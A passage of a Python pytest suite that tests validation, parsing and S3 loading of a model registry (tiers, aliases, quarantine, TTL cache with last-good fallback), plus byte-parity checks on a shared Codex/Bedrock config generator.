    doc["tiers"]["claude"]["opus"] = dated
    out, warnings, errors = mr.validate_registry(doc)
    assert errors == {}, errors
    assert not any("dated duplicate" in w for w in warnings), warnings
    assert dated in [r["modelId"] for r in out["models"]]
    assert mr.resolve_model(out, "opus", "claude") == dated
    assert mr.resolve_model(out, dated) == dated


def test_a_not_an_object_document_is_an_error():
    assert mr.validate_registry([1, 2, 3])[0] is None
    assert mr.validate_registry({"catalog": "nope"}) == (None, [], {"catalog": "missing_or_not_an_array"})
    # A document whose rows sit under `models` is NOT a registry (TEAM-5022):
    # there is one key, and reading a second one let the nightly reconcile write
    # a shadow catalog that this twin then preferred over the real one.
    assert mr.validate_registry({"models": [{"modelId": "us.anthropic.claude-opus-5"}]})[2] == {
        "catalog": "missing_or_not_an_array"
    }


# ─── 6b. parse_registry: normalize without the verdict ──────────────────────

def test_parse_registry_normalizes_a_document_the_validator_refuses():
    # The two halves answer different questions. parse_registry says what the
    # document SAYS (rows, aliases, folds); validate_registry says whether the hub
    # may serve it. A registry that kills a model some tier still points at is
    # refused by the second and still readable by the first — which is how the
    # shared fixture can ask what the RESOLVER does with it.
    doc = _registry()
    doc["quarantine"] = ["us.anthropic.claude-opus-5"]
    out, warnings, errors = mr.validate_registry(doc)
    assert out is None and errors["tiers.claude.opus"] == "quarantined"
    parsed, parse_warnings = mr.parse_registry(doc)
    assert parsed is not None
    assert mr.resolve_model(parsed, "opus", "claude") is None   # the kill switch still holds
    assert parse_warnings == warnings


def test_parsing_the_same_document_twice_gives_the_same_answer():
    # The alias and dated-fold passes rewrite `aliases`, so the parser works on a
    # COPY of each row — as the mjs twin already did. Without that, validating a
    # document and then parsing it gave two different catalogs.
    doc = _registry()
    doc["catalog"].append({"modelId": "us.anthropic.claude-opus-5-20251001-v1:0"})
    first, _ = mr.parse_registry(doc)
    second, _ = mr.parse_registry(doc)
    assert [r["modelId"] for r in first["models"]] == [r["modelId"] for r in second["models"]]
    assert first["_aliasOwner"] == second["_aliasOwner"]
    assert doc["catalog"][0]["aliases"] == ["fable-5"], "the caller's document must not be rewritten"


def test_parse_registry_still_refuses_a_structurally_broken_document():
    assert mr.parse_registry([1, 2, 3])[0] is None
    assert mr.parse_registry({"catalog": "nope"})[0] is None
    assert mr.parse_registry({"models": [{"modelId": "us.anthropic.claude-opus-5"}]})[0] is None
    assert mr.parse_registry(None)[0] is None


def test_parse_registry_keeps_catalog_integrity_problems_readable():
    # A duplicate alias is fatal to the VERDICT and not to the normalize: the
    # alias is dropped either way, so the rows are still usable.
    doc = _registry()
    doc["catalog"][1]["aliases"] = ["fable-5"]
    assert mr.validate_registry(doc)[0] is None
    parsed, warnings = mr.parse_registry(doc)
    assert parsed is not None
    assert mr.resolve_model(parsed, "fable-5") == "us.anthropic.claude-fable-5-1"
    assert any("ambiguous" in w for w in warnings)


def test_agents_keys_are_checked_against_the_real_roster():
    roster = REPO_ROOT / "src" / "config" / "agents.json"
    doc = _registry()
    doc["agents"] = {"not_a_real_agent": "us.anthropic.claude-opus-5"}
    out, _, errors = mr.validate_registry(doc, agents_path=str(roster))
    # Reported, but served: a stale pin for an agent a later deploy removed is not
    # corruption (NON_FATAL_READ_REASONS, mirror of the hub's registryReadFailure).
    assert out is not None
    assert errors["agents.not_a_real_agent"] == "unknown_agent"


def test_the_telegram_bridge_is_an_exempt_agent_id():
    roster = REPO_ROOT / "src" / "config" / "agents.json"
    doc = _registry()
    doc["agents"] = {"telegram_intake": "us.anthropic.claude-opus-5"}
    out, _, errors = mr.validate_registry(doc, agents_path=str(roster))
    assert errors == {} and out is not None


def test_the_roster_check_is_skipped_when_agents_json_is_unreadable():
    # agents.json is NOT shipped into either Python container, so absence is the
    # normal case at runtime and must not invalidate a good registry.
    doc = _registry()
    doc["agents"] = {"whatever_agent": "us.anthropic.claude-opus-5"}
    out, _, errors = mr.validate_registry(doc, agents_path="/nonexistent/agents.json")
    assert errors == {} and out is not None


# ─── 7. load_registry ───────────────────────────────────────────────────────

def test_load_registry_without_a_bucket_returns_none(caplog):
    with caplog.at_level("INFO"):
        assert mr.load_registry() is None
    assert "registry.fallback reason=no-bucket" in caplog.text


def _stub_s3(monkeypatch, body, etag="abc123", calls=None):
    class _Body:
        def read(self):
            return body

    class _Client:
        def get_object(self, Bucket, Key):
            if calls is not None:
                calls.append((Bucket, Key))
            return {"Body": _Body(), "ETag": f'"{etag}"'}

    monkeypatch.setenv("ARTIFACT_BUCKET", "bkt")
    monkeypatch.setitem(sys.modules, "boto3", type("m", (), {"client": staticmethod(lambda *a, **k: _Client())}))


def test_load_registry_reads_s3_and_logs_the_load(monkeypatch, caplog):
    calls = []
    _stub_s3(monkeypatch, json.dumps(_registry()).encode(), calls=calls)
    with caplog.at_level("INFO"):
        reg = mr.load_registry()
    assert reg is not None
    assert calls == [("bkt", "config/models.json")]
    assert "registry.loaded source=s3 version=3 rows=6 etag=abc123" in caplog.text


def test_load_registry_does_one_get_per_call_by_default(monkeypatch):
    # The hot-reload contract: a tier repointed by the reconcile must be visible
    # on the NEXT turn of a warm container, with no redeploy.
    calls = []
    _stub_s3(monkeypatch, json.dumps(_registry()).encode(), calls=calls)
    mr.load_registry()
    mr.load_registry()
    assert len(calls) == 2


def test_load_registry_caches_only_when_asked(monkeypatch):
    calls = []
    _stub_s3(monkeypatch, json.dumps(_registry()).encode(), calls=calls)
    mr.load_registry(ttl_seconds=60)
    mr.load_registry(ttl_seconds=60)
    assert len(calls) == 1


def test_load_registry_on_bad_json(monkeypatch, caplog):
    _stub_s3(monkeypatch, b"{not json")
    with caplog.at_level("WARNING"):
        assert mr.load_registry() is None
    assert "registry.fallback reason=parse" in caplog.text


def test_load_registry_on_an_invalid_document(monkeypatch, caplog):
    doc = _registry()
    doc["defaults"]["persona"] = "gone"
    _stub_s3(monkeypatch, json.dumps(doc).encode())
    with caplog.at_level("WARNING"):
        assert mr.load_registry() is None
    assert "registry.fallback reason=invalid" in caplog.text


def test_fatal_read_errors_drops_only_the_point_in_time_reasons():
    errors = {"agents.gone_agent": "unknown_agent", "defaults.persona": "unprobed",
              "tiers.codex.luna": "unpriced"}
    assert mr.fatal_read_errors(errors) == {"tiers.codex.luna": "unpriced"}
    assert mr.fatal_read_errors({}) == {}
    assert mr.NON_FATAL_READ_REASONS == frozenset({"unknown_agent", "unprobed"})


def test_load_registry_serves_a_document_whose_only_fault_is_unprobed(monkeypatch, caplog):
    # TEAM-5016 finding 1: a routed candidate whose re-probe failed is a state to
    # fix, not a reason to drop the fleet to env/literal. Reported, and served.
    doc = _registry()
    doc["catalog"][0]["status"] = "candidate"
    doc["catalog"][0]["probe"] = {"api": {"ok": True}, "cli": {"ok": False, "error": "turn failed"}}
    _stub_s3(monkeypatch, json.dumps(doc).encode())
    with caplog.at_level("INFO"):
        reg = mr.load_registry()
    assert reg is not None
    assert mr.resolve_agent_model(reg, "agentcore_hub_frontend_dev") == "us.anthropic.claude-fable-5-1"
    assert "registry.error defaults.persona reason=unprobed" in caplog.text
    assert "registry.fallback reason=invalid" not in caplog.text
    assert "registry.loaded source=s3" in caplog.text


class _MutableBody:
    """A stub S3 body whose content the test can swap between calls."""

    def __init__(self, body):
        self.body = body

    def read(self):
        return self.body


def _stub_s3_mutable(monkeypatch, body):
    holder = _MutableBody(body)

    class _Client:
        def get_object(self, Bucket, Key):
            return {"Body": holder, "ETag": '"abc123"'}

    monkeypatch.setenv("ARTIFACT_BUCKET", "bkt")
    monkeypatch.setitem(sys.modules, "boto3", type("m", (), {"client": staticmethod(lambda *a, **k: _Client())}))
    return holder


def test_load_registry_keeps_the_last_good_document_when_a_cached_read_is_refused(monkeypatch, caplog):
    # TEAM-5016 finding 2: the TTL cache used to store the refusal (None) and serve
    # nothing for a whole TTL. Now a refused read keeps the last good document,
    # as the hub's lastGoodRegistry() does.
    good = _registry()
    holder = _stub_s3_mutable(monkeypatch, json.dumps(good).encode())
    first = mr.load_registry(ttl_seconds=60)
    assert first is not None and first["version"] == 3

    bad = _registry()
    bad["defaults"]["persona"] = "gone"
    holder.body = json.dumps(bad).encode()
    mr._CACHE["at"] = 0.0          # expire the TTL without sleeping
    with caplog.at_level("WARNING"):
        second = mr.load_registry(ttl_seconds=60)
    assert second is not None and second["version"] == 3
    assert "registry.fallback reason=invalid" in caplog.text
    assert "registry.fallback keeping=last-good" in caplog.text
    # And the TTL was stamped: the next call within the TTL does not re-read.
    assert mr.load_registry(ttl_seconds=60) is second


def test_load_registry_first_refusal_with_no_last_good_still_caches_none(monkeypatch, caplog):
    bad = _registry()
    bad["defaults"]["persona"] = "gone"
    _stub_s3_mutable(monkeypatch, json.dumps(bad).encode())
    with caplog.at_level("WARNING"):
        assert mr.load_registry(ttl_seconds=60) is None
    assert "keeping=last-good" not in caplog.text
    assert mr._CACHE["doc"] is None


def test_load_registry_swallows_an_s3_error(monkeypatch, caplog):
    class _Client:
        def get_object(self, **kwargs):
            raise RuntimeError("AccessDenied")

    monkeypatch.setenv("AGENTCORE_HUB_ARTIFACT_BUCKET", "bkt")
    monkeypatch.setitem(sys.modules, "boto3",
                        type("m", (), {"client": staticmethod(lambda *a, **k: _Client())}))
    with caplog.at_level("WARNING"):
        assert mr.load_registry() is None
    assert "registry.fallback reason=s3" in caplog.text


def test_the_hub_specific_bucket_var_wins(monkeypatch):
    # AgentCore reserves ARTIFACT_BUCKET on the fleet runtime, so the hub name
    # must be preferred wherever both are set.
    calls = []
    _stub_s3(monkeypatch, json.dumps(_registry()).encode(), calls=calls)
    monkeypatch.setenv("AGENTCORE_HUB_ARTIFACT_BUCKET", "hub-bkt")
    mr.load_registry()
    assert calls[0][0] == "hub-bkt"


# ─── ONE Codex config generator (byte-identical block in both twins' tests) ──
# There were two generators and they drifted: the fleet runtime named the
# provider "Amazon Bedrock Runtime (OpenAI-compatible)", inlined the base URL and
# carried its own output cap, while the coding runtime's merger was correct. Now
# codex_config_fragment in THIS module is the only one, and these tests are what
# keeps it that way — the merger's output must be byte-identical to the fragment,
# and main.py must have no provider strings left of its own.

FLEET_MAIN = REPO_ROOT / "deploy" / "runtime-agent" / "main.py"
MERGER = REPO_ROOT / "deploy" / "coding-agent-runtime" / "merge-codex-config.py"

# One id per endpoint: the two branches ARE the contract (web_search here,
# OpenAI-Project there), so neither may be tested alone.
CODEX_ENDPOINT_INPUTS = [
    ("us.openai.gpt-6-astra", "bedrock-runtime", "us-east-1"),
    ("openai.gpt-5.5", "bedrock-mantle", "us-east-2"),
]


def _load_merger():
    """merge-codex-config.py, loaded the way the container runs it: its own
    directory on sys.path, so its `from models_registry import …` finds the twin
    sitting next to it. If the merger ever grows a private copy of the fragment,
    the byte-equality test below is what notices."""
    import sys as _sys
    spec = importlib.util.spec_from_file_location("merge_codex_config_under_test", MERGER)
    mod = importlib.util.module_from_spec(spec)
    _sys.path.insert(0, str(MERGER.parent))
    try:
        spec.loader.exec_module(mod)
    finally:
        _sys.path.remove(str(MERGER.parent))
    return mod


@pytest.mark.parametrize("model_id,endpoint,region", CODEX_ENDPOINT_INPUTS)
def test_the_merger_emits_exactly_the_shared_fragment(model_id, endpoint, region):
    merger = _load_merger()
    base_url = mr.base_url_for(endpoint, region)
    args = (model_id, base_url, endpoint, "default", 400000)
    assert merger.our_fragment(*args) == mr.codex_config_fragment(*args)
    # Merged into an EMPTY user config the whole file is ours, which is exactly
    # what the fleet runtime's local fallback writes.
    assert merger.merge("", *args) == mr.codex_config_text(*args)


@pytest.mark.parametrize("model_id,endpoint,region", CODEX_ENDPOINT_INPUTS)
def test_the_fragment_carries_the_per_endpoint_rules(model_id, endpoint, region):
    text = mr.codex_config_text(model_id, mr.base_url_for(endpoint, region), endpoint, "proj-x")
    mantle = endpoint == "bedrock-mantle"
    assert f"[model_providers.{endpoint}]" in text
    assert f'model_provider = "{endpoint}"' in text
    assert f"model_max_output_tokens = {mr.CODEX_MAX_OUTPUT_TOKENS}" in text
    # web_search on bedrock-runtime ONLY (a --yolo turn dies without it there);
    # the project header on mantle ONLY ("Engine not found" without it).
    assert ('web_search = "disabled"' in text) == (not mantle)
    assert ('OpenAI-Project = "proj-x"' in text) == mantle
    expected_name = ("Amazon Bedrock Mantle (OpenAI-compatible)" if mantle
                     else "Amazon Bedrock (OpenAI-compatible)")
    assert f'name = {json.dumps(expected_name)}' in text
    # Top-level keys before the first [table] header, or they become keys OF it.
    assert text.index("model = ") < text.index("[model_providers.")


def test_the_fleet_runtime_writes_no_provider_config_of_its_own():
    """main.py cannot be imported (module-level Strands construction), so its half
    of the parity is asserted as text: every TOML key of the provider block has to
    come from the fragment, or the two writers can drift again."""
    text = FLEET_MAIN.read_text()
    for owned in ("[model_providers", "model_provider =", "model_context_window",
                  "model_max_output_tokens", "wire_api", "env_key"):
        assert owned not in text, f"{owned!r} is written in main.py, not by the fragment"
    assert "codex_config_text(" in text, "main.py must call the shared generator"
